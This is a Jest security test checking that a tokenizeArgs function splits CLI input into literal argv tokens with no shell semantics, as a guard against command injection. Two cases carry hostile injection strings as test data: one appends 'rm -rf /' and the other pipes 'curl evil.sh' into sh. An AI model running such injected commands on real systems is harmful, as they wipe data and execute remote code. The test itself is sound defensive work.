/**
 * Security test: tokenizeArgs must split free-form CLI input into argv with
 * NO shell semantics. Shell metacharacters become inert literal arguments,
 * which is what closes the command-injection/RCE class (the argv is handed to
 * execFile with shell:false).
 */
import { describe, expect, test } from "@jest/globals";
import { tokenizeArgs } from "../src/index";

describe("tokenizeArgs (shell-free argv)", () => {
  test("splits plain args on whitespace", () => {
    expect(tokenizeArgs("client gas")).toEqual(["client", "gas"]);
  });

  test("preserves double-quoted segments with spaces", () => {
    expect(tokenizeArgs('move new "my project"')).toEqual(["move", "new", "my project"]);
  });

  test("handles attached key=\"value\" form", () => {
    expect(tokenizeArgs('--name="hello world"')).toEqual(["--name=hello world"]);
  });

  test("handles single quotes", () => {
    expect(tokenizeArgs("--filter 'a b'")).toEqual(["--filter", "a b"]);
  });

  test("shell metacharacters are inert literal tokens (no shell)", () => {
    // ';' is NOT a separator — it reaches execFile as a literal token, so
    // `iota` simply rejects it; nothing is ever executed by a shell.
    expect(tokenizeArgs("client gas; rm -rf /")).toEqual([
      "client",
      "gas;",
      "rm",
      "-rf",
      "/",
    ]);
    expect(tokenizeArgs("client gas && curl evil.sh | sh")).toEqual([
      "client",
      "gas",
      "&&",
      "curl",
      "evil.sh",
      "|",
      "sh",
    ]);
  });

  test("empty / whitespace-only input yields no args", () => {
    expect(tokenizeArgs("")).toEqual([]);
    expect(tokenizeArgs("   \t  ")).toEqual([]);
  });
});
